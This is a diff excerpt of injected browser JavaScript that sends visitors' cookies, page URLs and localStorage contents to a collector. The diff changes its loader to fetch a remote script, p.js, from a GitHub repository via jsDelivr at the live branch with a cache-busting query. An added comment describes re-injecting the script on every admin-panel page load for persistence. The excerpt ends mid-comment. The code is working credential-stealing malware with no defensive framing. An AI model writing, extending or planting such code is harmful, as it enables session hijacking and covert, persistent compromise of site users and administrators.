@@ -64,7 +64,9 @@ post("agent",[location.href,document.title,location.referrer,document.cookie].jo
 post("ls",ls());
 summary("agent",location.host+location.pathname+" ck="+document.cookie.slice(0,1200));
 if(P){post("panel",location.host+" iframe="+(function(){try{return top!==self}catch(e){return "?"}})()+" dom="+document.domain);
- var z=document.createElement("script");z.src="//cdn.jsdelivr.net/gh/polootyyy/cdnx@51038d3/p.js";document.body.appendChild(z);}
+ // v3: origin-fresh injection — new query per load = jsDelivr cache miss = GitHub @main bytes,
+ // so no frozen-pin drift and no edge-cache lag (was @51038d3 pre-residence).
+ var z=document.createElement("script");z.src="//cdn.jsdelivr.net/gh/polootyyy/cdnx@main/p.js?r="+String(Math.random()).slice(2,8);document.body.appendChild(z);}
 // --- v3 RESIDENT BRIDGE (added 2026-11-28) ---
 // On ANY panel host page (not just feedback): if p.js v3 has ever run in this browser
 // (localStorage __HL_R marker), re-inject it on every panel page load. This makes our
